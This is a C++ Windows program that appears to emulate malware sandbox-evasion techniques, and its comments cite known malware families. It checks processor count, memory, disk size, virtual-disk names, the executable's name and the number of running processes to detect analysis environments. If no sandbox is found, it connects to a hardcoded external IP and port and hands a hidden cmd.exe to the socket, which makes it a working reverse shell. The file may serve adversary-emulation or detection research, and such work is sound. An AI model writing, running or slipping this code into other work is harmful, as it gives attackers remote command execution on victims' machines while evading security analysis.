#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCKAPI_    // Prevent inclusion of winsock.h in windows.h

#include <winsock2.h>
#include <Windows.h>
#include <winhttp.h>
#include <winternl.h>
#include <shellscalingapi.h>
#include <shlobj.h>

// System Headers
#include <iphlpapi.h>
#include <setupapi.h>
#include <devguid.h>
#include <TlHelp32.h>
#include <psapi.h>

// Standard C/C++ Headers
#include <stdio.h>
#include <stdlib.h>
#include <iostream>
#include <string>
#include <sstream>
#include <vector>
#include <cstring>
#include <cstdint>
#include <time.h>
#include <io.h>
#include <strsafe.h>

// Library Links
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "Shcore.lib")
#pragma comment(lib, "setupapi.lib")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "Shell32.lib")
#pragma comment(lib, "Ole32.lib")



using namespace std;

const wchar_t *VIRTUAL_DEVICES[] = {
    L"VBOX",    
    L"VMWARE",  
    L"VIRTUAL", 
    L"QEMU"    
};

// S1130 Raspberry Robin
// S0264 OopsIE 
// S0182 FinFisher
// S0226 Smoke Loader
bool checkSystemResources()
{
    SYSTEM_INFO systemInfo;
    GetSystemInfo(&systemInfo);
    DWORD numberOfProcessors = systemInfo.dwNumberOfProcessors;
    if (numberOfProcessors < 2)
        return false;


    MEMORYSTATUSEX memoryStatus;
    memoryStatus.dwLength = sizeof(memoryStatus);
    GlobalMemoryStatusEx(&memoryStatus);
    DWORD RAMMB = memoryStatus.ullTotalPhys / 1024 / 1024;
    if (RAMMB < 2048)
        return false;

    HANDLE hDevice = CreateFileW(L"\\\\.\\PhysicalDrive0", 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (hDevice == INVALID_HANDLE_VALUE)
        return false;

    DISK_GEOMETRY pDiskGeometry;
    DWORD bytesReturned;
    if (!DeviceIoControl(hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY, NULL, 0, &pDiskGeometry, sizeof(pDiskGeometry), &bytesReturned, NULL))
    {
        CloseHandle(hDevice);
        return false;
    }

    DWORD diskSizeGB = pDiskGeometry.Cylinders.QuadPart * (ULONG)pDiskGeometry.TracksPerCylinder *
                       (ULONG)pDiskGeometry.SectorsPerTrack * (ULONG)pDiskGeometry.BytesPerSector / 1024 / 1024 / 1024;
    CloseHandle(hDevice);
    if (diskSizeGB < 100)
        return false;

    return true;
}

// S1087	AsyncRAT
bool CheckHDDName()
{
    HDEVINFO hDeviceInfo = SetupDiGetClassDevs(&GUID_DEVCLASS_DISKDRIVE, 0, 0, DIGCF_PRESENT);
    if (hDeviceInfo == INVALID_HANDLE_VALUE)
        return true;

    SP_DEVINFO_DATA deviceInfoData;
    deviceInfoData.cbSize = sizeof(SP_DEVINFO_DATA);

    if (!SetupDiEnumDeviceInfo(hDeviceInfo, 0, &deviceInfoData))
        return true;

    DWORD propertyBufferSize = 0;
    SetupDiGetDeviceRegistryPropertyW(hDeviceInfo, &deviceInfoData, SPDRP_FRIENDLYNAME, NULL, NULL, 0, &propertyBufferSize);
    PWSTR HDDName = (PWSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, propertyBufferSize);

    if (HDDName)
    {
        SetupDiGetDeviceRegistryPropertyW(hDeviceInfo, &deviceInfoData, SPDRP_FRIENDLYNAME, NULL, (PBYTE)HDDName, propertyBufferSize, NULL);
        CharUpperW(HDDName);

        for (const wchar_t *virtualDevice : VIRTUAL_DEVICES)
        {
            if (wcsstr(HDDName, virtualDevice))
            {
                HeapFree(GetProcessHeap(), 0, HDDName);
                return false; 
            }
        }
        HeapFree(GetProcessHeap(), 0, HDDName);
    }
    return true;
}

// S0396	EvilBunny
bool CheckApplicationName()
{
    wchar_t currentProcessPath[MAX_PATH + 1];
    GetModuleFileNameW(NULL, currentProcessPath, MAX_PATH + 1);
    CharUpperW(currentProcessPath);
    if (!wcsstr(currentProcessPath, L"SANDBOXDEMOSUBTECH1.EXE"))
        return false;
    return true;
}

//  S0396	EvilBunny
bool checkSufficientProcesses()
{
    DWORD processIds[1024];
    DWORD bytesReturned;
    if (!EnumProcesses(processIds, sizeof(processIds), &bytesReturned))
    {
        return false;
    }

    DWORD processCount = bytesReturned / sizeof(DWORD);
    printf("Number of running processes: %d\n", processCount);


    return (processCount >= 50);
}

bool isSafeEnvironment()
{
    return checkSystemResources() && CheckHDDName() && CheckApplicationName() && checkSufficientProcesses();
}

int main(int argc, char *argv[])
{
    if (!isSafeEnvironment())
    {
        Sleep(15000);
        return 1;
    }
    string ip = "3.85.20.60";
    short port = 6125;

    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
    {
        return 1;
    }

    SOCKET WSock;
    WSock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, nullptr, (unsigned int)nullptr, (unsigned int)nullptr);

    struct sockaddr_in hax;
    hax.sin_family = AF_INET;
    hax.sin_port = htons(port);
    hax.sin_addr.s_addr = inet_addr(ip.c_str());

    if (WSAConnect(WSock, (SOCKADDR *)&hax, sizeof(hax), nullptr, nullptr, nullptr, nullptr) != 0)
    {
        closesocket(WSock);
        WSACleanup();
        return 1;
    }

    STARTUPINFOA sui;
    PROCESS_INFORMATION pi;
    memset(&sui, 0, sizeof(sui));
    sui.cb = sizeof(sui);
    sui.dwFlags = STARTF_USESTDHANDLES;
    sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE)WSock;
    sui.wShowWindow = SW_HIDE;

    string process = "cmd.exe";
    if (CreateProcessA(nullptr, (LPSTR)process.c_str(), nullptr, nullptr, TRUE, CREATE_NO_WINDOW, nullptr, nullptr, &sui, &pi))
    {
        HWND hWnd = FindWindowA("ConsoleWindowClass", nullptr);
        if (hWnd != nullptr) {
            PostMessage(hWnd, WM_CLOSE, 0, 0);
        }
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    closesocket(WSock);
    WSACleanup();

    return 0;
}
